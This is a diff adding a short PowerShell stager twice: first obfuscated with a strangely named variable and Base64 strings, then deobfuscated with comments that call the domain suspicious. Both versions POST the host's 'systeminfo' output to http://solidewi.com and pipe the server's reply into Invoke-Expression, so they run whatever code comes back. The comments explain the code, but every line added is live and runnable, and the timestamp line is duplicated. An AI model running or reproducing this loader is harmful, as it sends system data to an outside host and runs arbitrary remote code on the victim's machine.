@@ -1,0 +1,14 @@
+${___/====\/\__/\/\}=[int64](([datetime]::UtcNow-[datetime]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQA5ADcAMAAtADEALQAxAA==')))).TotalSeconds)-band 0xfffffffffffffff0;
+irm http://solidewi.com/${___/====\/\__/\/\} -method POST -b $(systeminfo|out-string) -content $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AbwBjAHQAZQB0AC0AcwB0AHIAZQBhAG0A')))|iex
+
+# This creates a variable with a strange name that calculates seconds since 1970-01-01
+# Then performs a bitwise AND operation with 0xfffffffffffffff0
+$timestamp = ([int64](([datetime]::UtcNow-[datetime]"1970-1-1").TotalSeconds)-band 0xfffffffffffffff0)
+
+# This sends a POST request to a suspicious domain with:
+# - URL containing the calculated timestamp
+# - System information as the request body 
+# - Content-type header set to "application/octet-stream"
+# Then executes whatever code is returned from the server
+$timestamp = ([int64](([datetime]::UtcNow-[datetime]"1970-1-1").TotalSeconds)-band 0xfffffffffffffff0)
+Invoke-RestMethod http://solidewi.com/$timestamp -method POST -body $(systeminfo|out-string) -contentType "application/octet-stream" | Invoke-Expression
